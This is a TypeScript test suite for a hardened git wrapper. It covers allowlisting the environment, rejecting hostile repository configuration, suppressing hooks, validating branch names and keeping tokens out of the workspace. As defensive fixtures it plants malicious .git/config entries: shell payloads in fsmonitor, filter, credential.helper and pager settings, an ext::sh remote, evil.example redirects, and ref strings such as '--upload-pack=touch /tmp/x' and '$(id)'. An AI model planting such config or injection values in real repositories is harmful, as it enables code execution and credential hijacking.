/**
 * Supervisor-side git hardening: env allowlist, config / hook / filter
 * neutralisation, per-invocation auth that never touches disk, and the
 * branch push guard. Uses real git and a local smart-HTTP server.
 */
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { promises as fs } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  GitRefError,
  UnsafeGitRepoError,
  __setGitBinaryForTests,
  assertPushableBranch,
  assertSafeGitDir,
  basicAuth,
  buildSafeGitEnv,
  gitClone,
  gitCommitAll,
  gitCreateBranch,
  gitCurrentBranch,
  gitDiffNumstat,
  gitEnsureRunBranch,
  gitPush,
  gitStageAllAndList,
  runGit,
  scrubWorkspaceGitCredentials,
} from '../src/safe-git.js';
import { startGitHttpServer, type GitHttpServer } from './helpers/git-http-server.js';

const TOKEN = 'ghs_TESTTOKEN0123456789abcdefABCDEF012345';
const SECRET_ENV = {
  KMS_MASTER_KEY: 'kms-super-secret-value-0001',
  GITHUB_APP_PRIVATE_KEY: '-----BEGIN RSA PRIVATE KEY-----abc',
  DATABASE_MIGRATE_URL: 'postgres://root:pw@db/mergecrew',
  ANTHROPIC_API_KEY: 'sk-ant-api03-secretsecretsecret',
  SKILL_SIGNING_KEY: 'signing-key-signing-key-signing-key-0000',
};

let tmp: string;

/** Plain git for fixture setup only (never the code under test). */
function fixtureGit(args: string[], cwd?: string): string {
  return execFileSync('git', args, {
    cwd,
    encoding: 'utf8',
    env: {
      PATH: process.env.PATH ?? '/usr/bin:/bin',
      HOME: tmp,
      GIT_CONFIG_NOSYSTEM: '1',
      GIT_CONFIG_GLOBAL: '/dev/null',
      GIT_AUTHOR_NAME: 'fixture',
      GIT_AUTHOR_EMAIL: 'f@example.com',
      GIT_COMMITTER_NAME: 'fixture',
      GIT_COMMITTER_EMAIL: 'f@example.com',
    },
  });
}

async function makeRepo(name = 'repo'): Promise<string> {
  const dir = path.join(tmp, name);
  fixtureGit(['init', '-q', '-b', 'main', dir]);
  await fs.writeFile(path.join(dir, 'README.md'), 'hello\n');
  fixtureGit(['add', '-A'], dir);
  fixtureGit(['commit', '-q', '-m', 'init'], dir);
  return dir;
}

async function appendConfig(repo: string, text: string): Promise<void> {
  await fs.appendFile(path.join(repo, '.git', 'config'), `\n${text}\n`);
}

const savedEnv: Record<string, string | undefined> = {};
beforeEach(async () => {
  tmp = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'mc-safegit-')));
  for (const [k, v] of Object.entries(SECRET_ENV)) {
    savedEnv[k] = process.env[k];
    process.env[k] = v;
  }
});

afterEach(async () => {
  __setGitBinaryForTests(null);
  for (const k of Object.keys(SECRET_ENV)) {
    if (savedEnv[k] === undefined) delete process.env[k];
    else process.env[k] = savedEnv[k];
  }
  await fs.rm(tmp, { recursive: true, force: true });
});

describe('git child env', () => {
  it('buildSafeGitEnv contains only the allowlist (no platform secrets)', () => {
    const env = buildSafeGitEnv();
    for (const [k, v] of Object.entries(SECRET_ENV)) {
      expect(env[k]).toBeUndefined();
      expect(Object.values(env)).not.toContain(v);
    }
    expect(env.GIT_TERMINAL_PROMPT).toBe('0');
    expect(env.GIT_CONFIG_NOSYSTEM).toBe('1');
    expect(env.GIT_CONFIG_GLOBAL).toBe('/dev/null');
    expect(env.HOME).not.toBe(os.homedir());
  });

  it('a spawned git (fake binary dumping its env/argv) sees no secrets and the safety -c flags', async () => {
    const repo = await makeRepo();
    const dump = path.join(tmp, 'dump.txt');
    const fake = path.join(tmp, 'fake-git');
    await fs.writeFile(fake, `#!/bin/sh\nenv > "${dump}"\necho "ARGV: $*" >> "${dump}"\n`, { mode: 0o755 });
    __setGitBinaryForTests(fake);
    await runGit(['status'], { cwd: repo, auth: basicAuth('https://github.com', 'x-access-token', TOKEN) });
    const out = await fs.readFile(dump, 'utf8');
    for (const [k, v] of Object.entries(SECRET_ENV)) {
      expect(out).not.toContain(k);
      expect(out).not.toContain(v);
    }
    // The token travels only as a URL-scoped header via GIT_CONFIG_*,
    // never on argv.
    const argv = out.split('\n').find((l) => l.startsWith('ARGV:'))!;
    expect(argv).not.toContain(TOKEN);
    expect(argv).not.toContain(Buffer.from(`x-access-token:${TOKEN}`).toString('base64'));
    expect(out).toContain('GIT_CONFIG_KEY_0=http.https://github.com/.extraheader');
    for (const flag of ['core.hooksPath=/dev/null', 'core.fsmonitor=false', 'protocol.file.allow=never', 'credential.helper=']) {
      expect(argv).toContain(flag);
    }
  });
});

describe('malicious repository configuration', () => {
  const marker = () => path.join(tmp, 'PWNED');
  const payload = () => `/bin/sh -c 'touch ${marker()}'`;

  const cases: Array<[string, (repo: string) => Promise<void>]> = [
    ['core.fsmonitor', (r) => appendConfig(r, `[core]\n\tfsmonitor = ${payload()}`)],
    ['core.hooksPath', (r) => appendConfig(r, `[core]\n\thooksPath = ${tmp}`)],
    ['filter driver', async (r) => {
      await appendConfig(r, `[filter "x"]\n\tclean = ${payload()}\n\tsmudge = ${payload()}`);
      await fs.writeFile(path.join(r, '.gitattributes'), '* filter=x\n');
    }],
    ['diff textconv', (r) => appendConfig(r, `[diff "x"]\n\ttextconv = ${payload()}`)],
    ['include.path', (r) => appendConfig(r, `[include]\n\tpath = ${tmp}/evil.cfg`)],
    ['includeIf', (r) => appendConfig(r, `[includeIf "gitdir:/"]\n\tpath = ${tmp}/evil.cfg`)],
    ['url.insteadOf', (r) => appendConfig(r, `[url "https://evil.example/"]\n\tinsteadOf = https://github.com/`)],
    ['credential.helper', (r) => appendConfig(r, `[credential]\n\thelper = !${payload()}`)],
    ['core.sshCommand', (r) => appendConfig(r, `[core]\n\tsshCommand = ${payload()}`)],
    ['core.pager', (r) => appendConfig(r, `[core]\n\tpager = ${payload()}`)],
    ['remote.origin.pushurl', (r) => appendConfig(r, `[remote "origin"]\n\tpushurl = https://evil.example/x.git`)],
    ['remote.origin.uploadpack', (r) => appendConfig(r, `[remote "origin"]\n\turl = https://github.com/a/b.git\n\tuploadpack = ${payload()}`)],
    ['ext:: remote url', (r) => appendConfig(r, `[remote "origin"]\n\turl = ext::sh -c touch% ${marker()}`)],
    ['token in remote url', (r) => appendConfig(r, `[remote "origin"]\n\turl = https://x-access-token:${TOKEN}@github.com/a/b.git`)],
    ['extensions.worktreeConfig', (r) => appendConfig(r, `[extensions]\n\tworktreeConfig = true`)],
    ['objects/info/alternates', (r) => fs.writeFile(path.join(r, '.git/objects/info/alternates'), `${tmp}/other/.git/objects\n`)],
    ['commondir', (r) => fs.writeFile(path.join(r, '.git/commondir'), `${tmp}/other/.git\n`)],
  ];

  for (const [name, plant] of cases) {
    it(`refuses to run git when .git/config has ${name}`, async () => {
      const repo = await makeRepo();
      await plant(repo);
      await expect(runGit(['status'], { cwd: repo })).rejects.toBeInstanceOf(UnsafeGitRepoError);
      await expect(gitCommitAll(repo, { message: 'm', authorName: 'a', authorEmail: 'a@b.c' })).rejects.toBeInstanceOf(UnsafeGitRepoError);
      await expect(fs.access(marker())).rejects.toThrow();
    });
  }

  it('refuses a symlinked .git and a gitfile', async () => {
    const real = await makeRepo('real');
    const ws1 = path.join(tmp, 'ws1');
    await fs.mkdir(ws1);
    await fs.symlink(path.join(real, '.git'), path.join(ws1, '.git'));
    await expect(assertSafeGitDir(ws1)).rejects.toThrow(/real directory/);
    const ws2 = path.join(tmp, 'ws2');
    await fs.mkdir(ws2);
    await fs.writeFile(path.join(ws2, '.git'), `gitdir: ${real}/.git\n`);
    await expect(assertSafeGitDir(ws2)).rejects.toThrow(/real directory/);
  });

  it('a clean repo passes validation', async () => {
    const repo = await makeRepo();
    await expect(assertSafeGitDir(repo)).resolves.toBeUndefined();
  });

  it('hooks never run even if validation were bypassed (-c core.hooksPath + --no-verify)', async () => {
    const repo = await makeRepo();
    for (const hook of ['pre-commit', 'commit-msg', 'post-commit', 'prepare-commit-msg', 'reference-transaction']) {
      await fs.writeFile(path.join(repo, '.git/hooks', hook), `#!/bin/sh\ntouch ${marker()}\n`, { mode: 0o755 });
    }
    await fs.writeFile(path.join(repo, 'a.txt'), 'x');
    const sha = await gitCommitAll(repo, { message: 'feat: x', authorName: 'Bot', authorEmail: 'b@x.y' });
    expect(sha).toMatch(/^[0-9a-f]{40}$/);
    await expect(fs.access(marker())).rejects.toThrow();
  });

  it('fsmonitor never runs even if validation were bypassed', async () => {
    const repo = await makeRepo();
    await appendConfig(repo, `[core]\n\tfsmonitor = ${payload()}`);
    await runGit(['status'], { cwd: repo, skipRepoCheck: true });
    await expect(fs.access(marker())).rejects.toThrow();
  });
});

describe('commit gating on the staged diff', () => {
  it('guard sees the real staged paths (incl. untracked) and can refuse', async () => {
    const repo = await makeRepo();
    await fs.mkdir(path.join(repo, '.github/workflows'), { recursive: true });
    await fs.writeFile(path.join(repo, '.github/workflows/deploy.yml'), 'on: push');
    await fs.writeFile(path.join(repo, 'src.ts'), 'x');
    let seen: string[] = [];
    await expect(
      gitCommitAll(repo, {
        message: 'm',
        authorName: 'a',
        authorEmail: 'a@b.c',
        guardStagedPaths: (p) => {
          seen = p;
          throw new Error('blocked');
        },
      }),
    ).rejects.toThrow('blocked');
    expect(seen.sort()).toEqual(['.github/workflows/deploy.yml', 'src.ts']);
    // Refused commit leaves nothing staged and HEAD unchanged.
    expect(fixtureGit(['diff', '--cached', '--name-only'], repo).trim()).toBe('');
    expect(fixtureGit(['rev-list', '--count', 'HEAD'], repo).trim()).toBe('1');
  });

  it('gitStageAllAndList lists deletions too', async () => {
    const repo = await makeRepo();
    await fs.rm(path.join(repo, 'README.md'));
    expect(await gitStageAllAndList(repo)).toEqual(['README.md']);
  });
});

describe('ref validation / branch creation', () => {
  it('rejects option-injection and odd start points', async () => {
    const repo = await makeRepo();
    for (const bad of ['--upload-pack=touch /tmp/x', '-b', '-', 'a..b', 'HEAD@{1}', 'refs/heads/../x', 'x y', 'main~1', '$(id)']) {
      await expect(gitCreateBranch(repo, 'mergecrew/ok', bad), bad).rejects.toBeInstanceOf(GitRefError);
    }
    await expect(gitCreateBranch(repo, '--force', 'HEAD')).rejects.toBeInstanceOf(GitRefError);
    await expect(gitCreateBranch(repo, 'mergecrew/x', 'does-not-exist')).rejects.toThrow(/unknown start point/);
    await gitCreateBranch(repo, 'mergecrew/feature', 'main');
    expect(await gitCurrentBranch(repo)).toBe('mergecrew/feature');
  });

  it('gitEnsureRunBranch moves a default-branch HEAD onto mergecrew/<run>', async () => {
    const repo = await makeRepo();
    expect(await gitEnsureRunBranch(repo, 'mergecrew/run-1')).toBe('mergecrew/run-1');
    expect(await gitCurrentBranch(repo)).toBe('mergecrew/run-1');
    // Already on a mergecrew/ branch → unchanged.
    await gitCreateBranch(repo, 'mergecrew/other');
    expect(await gitEnsureRunBranch(repo, 'mergecrew/run-1')).toBe('mergecrew/other');
  });

  it('assertPushableBranch refuses base/default/protected and non-mergecrew names', () => {
    expect(() => assertPushableBranch('main')).toThrow(GitRefError);
    expect(() => assertPushableBranch('develop', ['develop'])).toThrow(GitRefError);
    expect(() => assertPushableBranch('feature/x')).toThrow(/non-mergecrew/);
    expect(() => assertPushableBranch('mergecrew/')).toThrow(GitRefError);
    expect(() => assertPushableBranch('mergecrew/x', ['mergecrew/x'])).toThrow(/protected/);
    expect(() => assertPushableBranch('mergecrew/run-1')).not.toThrow();
  });
});

describe('legacy credential scrub', () => {
  it('removes tokens embedded in remote.origin.url', async () => {
    const repo = await makeRepo();
    fixtureGit(['remote', 'add', 'origin', `https://x-access-token:${TOKEN}@github.com/acme/web.git`], repo);
    expect(await scrubWorkspaceGitCredentials(repo)).toBe(true);
    const cfg = await fs.readFile(path.join(repo, '.git/config'), 'utf8');
    expect(cfg).not.toContain(TOKEN);
    expect(cfg).toContain('https://github.com/acme/web.git');
    await expect(assertSafeGitDir(repo)).resolves.toBeUndefined();
  });
});

describe('clone / push against a smart-HTTP remote (token never persisted)', { timeout: 60_000 }, () => {
  let srvRoot: string;
  let server: GitHttpServer;
  const auth = () => basicAuth(server.origin, 'x-access-token', TOKEN);

  beforeAll(async () => {
    srvRoot = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'mc-gitsrv-')));
    const prevTmp = tmp;
    tmp = srvRoot;
    const bare = path.join(srvRoot, 'acme', 'web.git');
    fixtureGit(['init', '-q', '--bare', '-b', 'main', bare]);
    const seed = await makeRepo('seed');
    fixtureGit(['push', '-q', bare, 'main:main'], seed);
    tmp = prevTmp;
    server = await startGitHttpServer(srvRoot, `Basic ${Buffer.from(`x-access-token:${TOKEN}`).toString('base64')}`);
  });

  afterAll(async () => {
    await server?.close();
    await fs.rm(srvRoot, { recursive: true, force: true });
  });

  async function grepTree(dir: string, needles: string[]): Promise<string[]> {
    const hits: string[] = [];
    async function walk(d: string) {
      for (const e of await fs.readdir(d, { withFileTypes: true })) {
        const full = path.join(d, e.name);
        if (e.isDirectory()) await walk(full);
        else if (e.isFile()) {
          const buf = await fs.readFile(full);
          for (const n of needles) if (buf.includes(n)) hits.push(`${full}: ${n.slice(0, 8)}…`);
        }
      }
    }
    await walk(dir);
    return hits;
  }

  it('clones with per-invocation auth; no token anywhere in the workspace', async () => {
    const dest = path.join(tmp, 'ws');
    await gitClone({ cleanUrl: `${server.url}/acme/web.git`, ref: 'main', dest, auth: auth() });
    expect(await fs.readFile(path.join(dest, 'README.md'), 'utf8')).toBe('hello\n');
    const b64 = Buffer.from(`x-access-token:${TOKEN}`).toString('base64');
    expect(await grepTree(dest, [TOKEN, b64])).toEqual([]);
    expect(server.seenAuth.some((a) => a.includes(b64))).toBe(true);
    await expect(assertSafeGitDir(dest)).resolves.toBeUndefined();
  });

  it('clone without auth is rejected by the remote (header is what authenticates)', async () => {
    await expect(
      gitClone({ cleanUrl: `${server.url}/acme/web.git`, ref: 'main', dest: path.join(tmp, 'noauth') }),
    ).rejects.toThrow(/clone failed/);
  });

  it('pushes only mergecrew/ branches, refuses the default branch, never persists the token', async () => {
    const dest = path.join(tmp, 'ws');
    const url = `${server.url}/acme/web.git`;
    await gitClone({ cleanUrl: url, ref: 'main', dest, auth: auth() });
    // Commit on the default branch: pushing it must be refused.
    await fs.writeFile(path.join(dest, 'x.txt'), 'x');
    await gitCommitAll(dest, { message: 'm', authorName: 'a', authorEmail: 'a@b.c' });
    await expect(gitPush(dest, url, 'main', auth(), { protectedBranches: ['main'] })).rejects.toBeInstanceOf(GitRefError);
    await expect(gitPush(dest, url, 'feature/x', auth())).rejects.toBeInstanceOf(GitRefError);
    await gitEnsureRunBranch(dest, 'mergecrew/run-1');
    await gitPush(dest, url, 'mergecrew/run-1', auth(), { protectedBranches: ['main'] });
    const remoteBranches = fixtureGit(['--git-dir', path.join(srvRoot, 'acme/web.git'), 'branch', '--list']);
    expect(remoteBranches).toContain('mergecrew/run-1');
    // Remote main is untouched (still 1 commit).
    expect(fixtureGit(['--git-dir', path.join(srvRoot, 'acme/web.git'), 'rev-list', '--count', 'main']).trim()).toBe('1');
    const b64 = Buffer.from(`x-access-token:${TOKEN}`).toString('base64');
    expect(await grepTree(dest, [TOKEN, b64])).toEqual([]);
    const stats = await gitDiffNumstat(dest, 'main', 'mergecrew/run-1');
    expect(stats).toEqual([{ path: 'x.txt', additions: 1, deletions: 0 }]);
  });
});
